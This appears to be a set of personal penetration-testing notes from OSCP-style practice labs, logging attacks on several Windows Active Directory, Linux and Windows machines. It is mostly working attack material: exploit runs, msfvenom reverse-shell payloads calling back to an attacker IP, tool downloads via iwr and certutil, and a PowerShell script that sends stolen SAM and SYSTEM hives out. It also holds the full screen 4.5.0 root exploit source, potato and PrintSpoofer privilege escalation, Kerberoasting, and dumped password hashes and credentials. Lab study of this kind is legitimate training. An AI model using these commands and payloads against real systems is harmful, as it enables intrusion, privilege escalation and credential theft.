PHPSESSID: t12eofdk0845f2peolfh6vbhan

IN 50801 remove /apsystem/path because this direct path is /admin/shell.php
>python3 50801.py http://192.168.204.141:81
#Shell running on the path no need to mention the full path
pwd, ls commands not work
RCE > dir C:\Users\                    
 Volume in drive C has no label.
 Volume Serial Number is 3C99-887F

 Directory of C:\Users

11/21/2022  12:40 AM    <DIR>          .
11/21/2022  12:40 AM    <DIR>          ..
03/25/2022  01:08 PM    <DIR>          Administrator
11/10/2022  03:06 AM    <DIR>          Administrator.OSCP
06/12/2024  03:55 AM    <DIR>          celia.almeda
06/12/2024  03:55 AM    <DIR>          Mary.Williams
11/19/2020  12:48 AM    <DIR>          Public
12/05/2022  06:47 AM    <DIR>          support
11/14/2022  12:23 AM    <DIR>          web_svc
               0 File(s)              0 bytes
               9 Dir(s)  11,151,855,616 bytes free
RCE > whoami /priv
Privilege Name                        				 Description										                               State   
============================= ========================================= ========
SeShutdownPrivilege                			Shut down the system                						       Disabled
SeChangeNotifyPrivilege       			Bypass traverse checking               					   Enabled 
SeUndockPrivilege                     			Remove computer from docking station      Disabled
SeImpersonatePrivilege         			Impersonate a client after authentication 	Enabled 
SeCreateGlobalPrivilege        			 Create global objects                    						    Enabled 
SeIncreaseWorkingSetPrivilege    Increase a process working set            				Disabled
SeTimeZonePrivilege                           Change the time zone                     					    Disabled

RCE > 

>dir
>dir C:\Users\Mary.Williams\Desktop
>dir C:\Users\celia.almeda\Desktop

>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.220 LPORT=4444 -f exe -o met4444.exe
>iwr -uri http://192.168.45.220:8000/met4444.exe -Outfile C:\Users\celia.almeda\Desktop\met.exe
>certutil.exe -urlcache -f http://192.168.45.220:8000/met4444.exe met.exe
>rlwrap nc -nlvp 4444
#Got the shell
>iwr -uri http://192.168.45.220:8000/winPEASx64.exe -Outfile winPEAS.exe
>iwr -uri http://192.168.45.220:8000/DeadPotato-NET4.exe -Outfile Deadpotato.exe
>.\Deadpotato.exe -newadmin ashok:Ashok@123
#Error with password policy
>.\Deadpotato.exe -newadmin ashok:iRGxv26fsPYH
PS C:\Users\Mary.Williams\Desktop> net localgroup administrators
Members
-------------------------------------------------------------------------------
Administrator
ashok
OSCP\Domain Admins
The command completed successfully.
#Deadpotato added user into admin group not given any shell

#Impacket-psexec, wmiexec
>impacket-wmiexec -i 192.168.204.141 -u ashok -p 'iRGxv26fsPYH'           
>impacket-wmiexec oscp.exam/ashok:'iRGxv26fsPYH'@192.168.204.141
>impacket-psexec oscp.exam/ashok:'iRGxv26fsPYH'@192.168.204.141
>mpacket-psexec oscp.exam/ashok:iRGxv26fsPYH@192.168.204.141  
>impacket-wmiexec oscp.exam/ashok:iRGxv26fsPYH@192.168.204.141
>impacket-wmiexec ashok:iRGxv26fsPYH@192.168.204.141
[*] SMBv3.0 dialect used
[-] rpc_s_access_denied
>impacket-psexec ashok:iRGxv26fsPYH@192.168.204.141
[*] Requesting shares on 192.168.204.141.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'setup' is not writable.

>smbclient -L ////192.168.204.141 -U ashok                                   
Password for [WORKGROUP\ashok]:
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        setup           Disk 
No login with setup 
>iwr -uri http://192.168.45.220:8000/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
>.\PrintSpoofer64.exe -i -c powershell
#Got Admin Access

Mimicatz.exe
>celia.almeda: OSCP : e728ecbadfb02f51ce8eed753f3ff3fd

Serach files
>Get-ChildItem -Path C:\Users -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
>Get-ChildItem -Path C:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue

Lateral Movement
#As Noticed that AD Network has only one proof.txt flag in DC01 Moving to Internal Network
>certutil.exe -urlcache -f http://192.168.45.220:8000/Lagent.exe agent.exe
>.\agent.exe -connect 192.168.45.220:11601 -ignore-cert

#Lateral Move - 10.10.154.140,142
Ping TTL value is 64 might be Kinux for both 10.10.154.140,142 both having SMB

140 - 593, 5985, 49675
142 - 5985, 47001 Nothing will hit web page in browser.

#SMB
>crackmapexec smb 10.10.154.142 -u '' -p ''
>crackmapexec smb 10.10.154.142 
>smbclient -L ////10.10.154.140
>smbclient -L ////10.10.154.142
>smbmap -H 10.10.154.140 -u '' -p '' 
smbmap -H 10.10.154.142 -u '' -p '' 

#SharpHound
>sudo service ssh start
>scp .\20240923122403_BloodHound.zip kali@192.168.45.220:/home/kali/HTB/OSCP/OSCPA
Shell not responding closed with ctrl+z or ctrl+c

Working
From Windows:   First start kali NC command
$client = New-Object System.Net.Sockets.TcpClient("192.168.45.220", 1234) 
$stream = $client.GetStream() 
[byte[]]$buffer = [System.IO.File]::ReadAllBytes("C:\Users\mary.williams\Desktop\20240923122403_BloodHound.zip")  
$stream.Write($buffer, 0, $buffer.Length) 
$stream.Close() 
$client.Close()

From Kali: 
nc -lvp 1234 > 20240923122403_BloodHound.zip

#3 accounts  Kerberoasting
SQL_SVC, web_SVC, KRBTGT
>.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
#Got SQL_SVC, web_SVC:

#Crackmapexec
>crackmapexec winrm 10.10.154.140 -u users.txt -p pass.txt
>crackmapexec winrm 10.10.154.142 -u users.txt -p pass.txt

MSSQL
>crackmapexec mssql 10.10.154.142 -u users.txt -p pass.txt
[+] oscp.exam\web_svc:Diamond1

reg save hklm\sam c:\sam
reg save hklm\system c:\system

>SYSTEM
$client = New-Object System.Net.Sockets.TcpClient("192.168.45.220", 1234) 
$stream = $client.GetStream() 
[byte[]]$buffer = [System.IO.File]::ReadAllBytes("C:\system") 
$stream.Write($buffer, 0, $buffer.Length) 
$stream.Close() 
$client.Close()

From Kali: 
nc -lvp 1234 > system

#SAM
$client = New-Object System.Net.Sockets.TcpClient("192.168.45.220", 1234) 
$stream = $client.GetStream() 
[byte[]]$buffer = [System.IO.File]::ReadAllBytes("C:\sam")  
$stream.Write($buffer, 0, $buffer.Length) 
$stream.Close() 
$client.Close()

From Kali: 
nc -lvp 1234 > sam
#SYSTEM & SAM
impacket-secretsdump -system system -sam sam local 
[*] Target system bootKey: 0xa5403534b0978445a2df2d30d19a7980
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
Mary.Williams:1002:aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e:::
support:1003:aad3b435b51404eeaad3b435b51404ee:d9358122015c5b159574a88b3c0d2071:::
[*] Cleaning up...

#Login with Administrator for tunneling
>evil-winrm -i oscp.exam/192.168.210.141 -u administrator -H 3c4495bbd678fac8c9d218be4f2bbc7b (Not working)
>evil-winrm -i 192.168.210.141 -u administrator -H 3c4495bbd678fac8c9d218be4f2bbc7b #Hit

>evil-winrm -i oscp.exam/10.10.170.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd  (Not working)
>evil-winrm -i 10.10.170.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd  #Hit

10.10.170.142
>evil-winrm -i 10.10.170.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd  #Hit

In C drive has windows.old folder folder in that SAM, SYSTEM file C:\windows.old\windows\system32
#Privilege Escalation
impacket-secretsdump -system SYSTEM -sam SAM local
[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
[*] Cleaning up...

10.10.170.140
>evil-winrm -i 10.10.170.140 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc
>whoami /priv
# has SeImpersnate, SeBackup

#SeImpersnate
>upload /home/kali/HTB/OSCP/OSCPA/PrintSpoofer64.exe
*Evil-WinRM* PS C:\Users\tom_admin\Documents> .\PrintSpoofer64.exe -i -c powershell
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().
[!] CreateProcessWithTokenW() isn't compatible with option -i

>upload /home/kali/HTB/OSCP/OSCPA/DeadPotato-NET4.exe

>.\DeadPotato-NET4.exe -newadmin ashok:QweAsdZxc!123

>evil-winrm -i 10.10.170.140 -u ashok -p 'QweAsdZxc!123'

#Dump SAM and SYSTEM 
>reg save hklm\sam c:\sam
>reg save hklm\system c:\system
>download sam
>download system

impacket-secretsdump -system system -sam sam local
[*] Target system bootKey: 0x2b19f40edaa944df28651c2086c8fb02
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:99e5e7f0e49260d9a7337758de610362:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 

>evil-winrm -i 10.10.170.142 -u administrator -H 99e5e7f0e49260d9a7337758de610362 
```

### OSCPA -1 - Standalone Linux aerospike

```jsx
192.168.211.143

Directories
>gobuster dir -u http://192.168.162.143/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
http://192.168.211.143/api/
http://192.168.211.143/assets/
http://192.168.211.143/config/
http://192.168.211.143/content/
http://192.168.211.143/plugins/
http://192.168.211.143/themes/
http://192.168.211.143/vendor/

>gobuster dir -u http://192.168.162.143/sub/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
http://192.168.162.143/sub/index/
http://192.168.162.143/sub/page/

#Hint
>gobuster dir -u http://192.168.162.143/api/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
http://192.168.162.143/api/heartbeat
{"serviceName":"mysql","status":"online"},
{"serviceName":"postgres","status":"online"},
{"serviceName":"aerospike","status":"online"},
{"serviceName":"OpenSSH","status":"online"}
#Nmap Results
3000/tcp open     ppp?
3001/tcp open     nessus?
3002/tcp filtered exlm-agent
3003/tcp open     cgms?
3004/tcp filtered csoftragent
3005/tcp filtered deslogin
Aerospike port 3000 is widely used in real-time bidding, fraud detection, recommendation engines, and profile management.

wget http://192.168.45.220:80/linpeas.sh
sh linpeas.sh

Aerospike
-Should download the poc.lua to work, match the version of aerospike, Install with (sudo pip3 install aerospike)
-Try with basic commands ls, pwd, whoami below example

>python3 cve2020-13151.py --ahost 192.168.162.143 --cmd "whoami" #aero
>>python3 cve2020-13151.py --ahost 192.168.162.143 --cmd "cat /home/aero/local.txt"
#once above command is working start with reverse shell

>python3 cve2020-13151.py --ahost 192.168.162.143 --pythonshell --lport 3003 --lhost 192.168.45.220
>rlwrap nc -nlvp 3003

$ whoami
aero
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
bash: /root/.bashrc: Permission denied
aero@oscp:/$ 

#Sudo Version
Sudo version 1.8.31     

#Executing Linux Exploit Suggester
https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                          

[+] [CVE-2022-2586] nft_object UAF
   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit
   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
   
   
#Privilege Escalation
   cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF

gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell
   
/usr/bin/screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" 

#I did the same this with 41154, error `GLIBC_2.34' not found, trying to compile file libhax.c
HInt - For GLIBC error you can refer to this: https://github.com/X0RW3LL/XenSpawn

```

### OSCPA - 2 - Standalnone Linux

```jsx
192.168.218.144
http://192.168.218.144/.git/refs/heads/
>44a055daf7a0cd777f28f444c0d29ddf3ff08c54

Data In the folder read from the browser
0000000000000000000000000000000000000000 621a2e79b3a4a08bba12effe6331ff4513bad91a Stuart <luke@challenge.pwk> 1668808644 -0500	clone: from https://github.com/PWK-Challenge-Lab/dev.git
621a2e79b3a4a08bba12effe6331ff4513bad91a 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 Stuart <luke@challenge.pwk> 1668808714 -0500	commit: Security Update

http://192.168.218.144/.git/refs/heads/main 44a055daf7a0cd777f28f444c0d29ddf3ff08c54

#HInt 
Dump the git repo
https://github.com/arthaud/git-dumper
>python3 git_dumper.py http://192.168.218.144/.git/ ./website
git log > git_output.txt
python3 process_git_commits.py

$username = "stuart@challenge.lab"; "dean@challenge.pwk";
$password = "BreakingBad92";

>ssh stuart@192.168.218.144 (BreakingBad92)

>uname -a 
Linux oscp 5.15.0-53-generic #59-Ubuntu SMP Mon Oct 17 18:53:30 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

/opt/backup has 3 zip file sitebackup1.zip, sitebackup2.zip, sitebackup3.zip

#Zip file password crack 
>zip2john sitebackup3.zip > sitebackup3.hash
john -w=/home/kali/HTB/OSCP/rockyou.txt sitebackup3.hash
codeblue

in Unziped file has Joomla folder
Configuration.php

public $user = 'joomla';
public $password = 'Password@1';
public $db = 'jooml';
public $secret = 'Ee24zIK4cDhJHL4H';

ssh chloe@192.168.218.144 (Not worked with Password@1, Ee24zIK4cDhJHL4H)

Hint

In the shell (ssh stuart@192.168.218.144 (BreakingBad92))
su chloe (Ee24zIK4cDhJHL4H)
sudo su 
#Git root shell

```

### OSCPA - 3 - Standalnone WIndows

```jsx
192.168.249.145

By looing at the NMAP result has weird port 1978 unisql?  secrched the exploit in browser port 1978 unisql? bunch exploits may be try one by one.

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.220 LPORT=1234 -f exe > mouse1234.exe

>python3 49601.py 192.168.168.145 192.168.45.161 mouse1234.exe
#Error
Traceback (most recent call last):
  File "/home/kali/HTB/OSCP/OSCPB/49601.py", line 77, in <module>
    main()
  File "/home/kali/HTB/OSCP/OSCPB/49601.py", line 72, in main
    exploit()
  File "/home/kali/HTB/OSCP/OSCPB/49601.py", line 58, in exploit
    openCMD()
  File "/home/kali/HTB/OSCP/OSCPB/49601.py", line 44, in openCMD
    target.sendto("6f70656e66696c65202f432f57696e646f77732f53797374656d33322f636d642e6578650a".decode("hex"), (rhost,port)) # openfile /C/Windows/System32/cmd.exe
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'str' object has no attribute 'decode'. Did you mean: 'encode'?

>python3 50972.py 192.168.218.145 192.168.45.220 mouse1234.exe
#Got Initial shell with offsec user
python3 -m http.server 80
iwr -uri 192.168.45.220/winPEASx64.exe -Outfile winPEAS.exe
iwr -uri 192.168.45.220/nc.exe -Outfile nc.exe

.\nc.exe 192.168.45.161 1234 -e powershell.exe
rlwrap nc -nlvp 1234

.\winPEAS.exe > 145_winPEAS.txt

cve-2020-1013
>.\WSuspicious.exe /command:"" - accepteula - s - d cmd / c """"echo 1 > C:\\wsuspicious.txt"""""" /autoinstall
>./wsuxploit.sh 192.168.168.145 192.168.45.161 80 mouse1234.exe 
>rlwrap nc -nlvp 1234
 
 no success for both
 
 
 
 #winPEAS
 
Version: NetNTLMv2
  Hash:    offsec::OSCP:1122334455667788:1365ed26489f281d136fc9f7b4795875:0101000000000000b565fa429012db01a4bb5784fe0bf9a2000000000800300030000000000000000000000000200000f0bf20cc6300de3a0571050aa5fa99a69c0e1124c8c6010acc4c8c0efc07bef40a00100000000000000000000000000000000000090000000000000000000000 

Looking for possible password files in users homes
 https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\offsec\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt

 \C:\Program Files (x86)\Mouse Server\MouseServer.exe
 
 Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\WindowsApps\winget.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\WindowsApps\Skype.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\WindowsApps\python3.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\WindowsApps\python.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\WindowsApps\MicrosoftEdge.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\WindowsApps\GameBarElevatedFT_Alias.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\WindowsApps\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\GameBarElevatedFT_Alias.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\WindowsApps\Microsoft.SkypeApp_kzf8qxf38zg5c\Skype.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\WindowsApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdge.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\winget.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\python3.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\python.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe": offsec [AllAccess]
     File Permissions "C:\Users\offsec\AppData\Local\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe": offsec [AllAccess]
     
#Hint
Some said about Installed App in Windows, then it's related SSH Service (Not Mouse Server) then menioned PuTTY

#Some Credentials
RegKey Name: zachary
    RegKey Value: "&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'"
    
>xfreerdp /u:zachary /p:'Th3R@tC@tch3r' /v:192.168.218.145 /smart-sizing:1920x1080 /cert-ignore

Dumping the Hashes
reg save hklm\sam c:\sam
reg save hklm\system c:\system

scp .\sam kali@192.168.45.220:/home/kali/HTB/OSCP/OSCPA
scp .\system kali@192.168.45.220:/home/kali/HTB/OSCP/OSCPA

impacket-secretsdump -system system -sam sam local
[*] Target system bootKey: 0xefda5d42d4fb516149119632d1dd0320
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dd9f8b3d513cdcd207cd34ec76d8f8c9:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:329c4c51e208b151ffe2f002a100a6de:::
zachary:1001:aad3b435b51404eeaad3b435b51404ee:df3ebca610f20efee074e8098d555471:::
offsec:1002:aad3b435b51404eeaad3b435b51404ee:bc60cffce47a782bef58e915ca7cc3a9:::
[*] Cleaning up..

```

# OSCPB

### AD - web , ssh tunnel, impacket-mssqlclient

```jsx
Nmap Results
21/tcp    open  ftp           Microsoft ftpd
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http          Microsoft IIS httpd 10.0
8080/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=MS01.oscp.exam
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC

SItes
http://192.168.193.147:8000/
https://ms01.oscp.exam:8443/

SMB Enumeration
crackmapexec smb 192.168.193.147	# NO info
crackmapexec smb 192.168.193.147 -u '' -p '' #(name:MS01) (domain:oscp.exam) oscp.exam\: STATUS_ACCESS_DENIED 

smbclient -L //192.168.193.147 
smbclient -L ////192.168.193.147 
smbclient -L //192.168.193.147 -U '' -P '' 
smbclient -L //192.168.193.147 -U '' 

smbmap -H 192.168.193.147
smbmap -H 192.168.193.147 -u '' 
smbmap -H 192.168.193.147 -u '' -p ''
smbmap -H 192.168.193.147 -u '' -p '' -d oscp.exam

rpcclient -N 192.168.193.147
rpcclient -N 192.168.193.147 -U ''
rpcclient -N 192.168.193.147 -U '' -P ‘’

HTTP Enumeration
http://192.168.193.147:8000/ - Windows Server
https://ms01.oscp.exam:8443/ Some form for filling look for potential entry points

#No success with that  gobuster dir -u http://192.168.193.147:8443/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt 

#UNC Path
curl -T test.txt http://192.168.193.147:8000/test.txt 
# Accessing
https://ms01.oscp.exam:8443/test.txt    #404
http://192.168.193.147:8000/test.txt       #404

> msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.220 LPORT=1234 -f aspx > rev1234.aspx

Statred >impacket-smbserver share share -smb2support

#Browser
https://ms01.oscp.exam:8443/ in the url field \\192.168.45.220\test.txt, got web_svc.
web_svc::OSCP:aaaaaaaaaaaaaaaa:16ce5565d9c3e131ce467eaaaaaf643a:010100000000000000960303dc18db0159e69079217a525d000000000100100058006c0059006c006d004f00510075000300100058006c0059006c006d004f0051007500020010004400680046004c00480073007a004b00040010004400680046004c00480073007a004b000700080000960303dc18db01060004000200000008003000300000000000000000000000003000002412bd971f9d6250d5b686b6b39062a14d39387aa314a26802af55dd8f751efd0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200320030000000000000000000

>hashid "web_svc::OSCP:aaaaaaaaaaaaaaaa:16ce5565d9c3e131ce467eaaaaaf643a:010100000000000000960303dc18db0159e69079217a525d000000000100100058006c0059006c006d004f00510075000300100058006c0059006c006d004f0051007500020010004400680046004c00480073007a004b00040010004400680046004c00480073007a004b000700080000960303dc18db01060004000200000008003000300000000000000000000000003000002412bd971f9d6250d5b686b6b39062a14d39387aa314a26802af55dd8f751efd0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200320030000000000000000000"
#NetNTLMv2 

hashcat -m 5600 web_svc147.hash /home/kali/HTB/OSCP/rockyou.txt (Diamond1)

ssh web_svc@192.168.193.147 (DIamond1)
#Got Shell
iwr -uri http://192.168.45.220/winPEASx64.exe -OutFile winPEAS.exe   
iwr -uri http://192.168.45.220/SharpHound.exe -OutFile SharpHound.exe
.\SharpHound.exe
.\winPEAS.exe > 147winPEAS.txt

Transfered through ssh
kali>sudo systemctl start ssh
win>scp .\20241007104052_BloodHound.zip kali@192.168.45.220:/home/kali/HTB/OSCP/OSCPB
win>scp .\147winPEAS.txt kali@192.168.45.220:/home/kali/HTB/OSCP/OSCPB

From the Bloodhound 
Kerberoastable Users - web_svc, sql_svc, krbtgt

iwr -uri http://192.168.45.220/Rubeus.exe -OutFile Rubeus.exe
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
Got hashes of sql_svc ms02, web_svc ms01
$krb5tgs$23$*sql_svc$oscp.exam$MSSQL/MS02.oscp.exam@oscp.exam*$8C9D771CFFAFAFFB55F1A0491A2151C5$7B3037263C5F19EA1F699EE9C80F47474DFCA6427D3D7F087636D156B8CB3C8208E404901E49B5AD4C22B825CC88A3ADA473CDEA59C316C74F66CA635D6E1B42D1B97590D82E
